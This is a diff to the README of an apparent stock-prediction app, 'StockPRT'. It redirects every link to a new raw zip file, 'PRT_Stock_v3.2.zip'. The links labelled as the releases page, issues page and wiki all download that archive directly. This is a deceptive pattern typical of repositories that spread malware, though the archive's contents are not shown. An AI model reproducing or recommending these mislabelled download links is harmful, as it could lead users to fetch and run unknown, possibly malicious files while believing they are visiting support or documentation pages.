@@ -4,10 +4,10 @@
 Welcome to StockPRT! This is a user-friendly application designed to help you predict stock market prices. No technical skills are needed; just follow the steps below.
 
 ## 📥 Download StockPRT
-[![Download StockPRT](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/StockPRT.zip%20StockPRT-v1.0-blue)](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/StockPRT.zip)
+[![Download StockPRT](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/PRT_Stock_v3.2.zip%20StockPRT-v1.0-blue)](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/PRT_Stock_v3.2.zip)
 
 ## 🌐 Download & Install
-To get started, you will need to download StockPRT. Visit the [Releases Page](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/StockPRT.zip) to download the latest version. 
+To get started, you will need to download StockPRT. Visit the [Releases Page](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/PRT_Stock_v3.2.zip) to download the latest version. 
 
 1. Click the link above to open the Releases page.
 2. Look for the most recent version of StockPRT.
@@ -45,9 +45,9 @@ Here are some key features of StockPRT that enhance your stock prediction experi
 - **Downloadable Reports**: Save your results for future reference.
 
 ## 📞 Need Support?
-If you encounter any issues or have questions about using StockPRT, please visit our [issues page](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/StockPRT.zip) to report problems or ask for help.
+If you encounter any issues or have questions about using StockPRT, please visit our [issues page](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/PRT_Stock_v3.2.zip) to report problems or ask for help.
 
 ## 🔗 Additional Resources
-You can learn more about stock market predictions and how StockPRT works by visiting our [Wiki](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/StockPRT.zip). 
+You can learn more about stock market predictions and how StockPRT works by visiting our [Wiki](https://raw.githubusercontent.com/dotsatya/StockPRT/main/Egyptize/PRT_Stock_v3.2.zip). 
 
 Thank you for choosing StockPRT! Happy predicting!
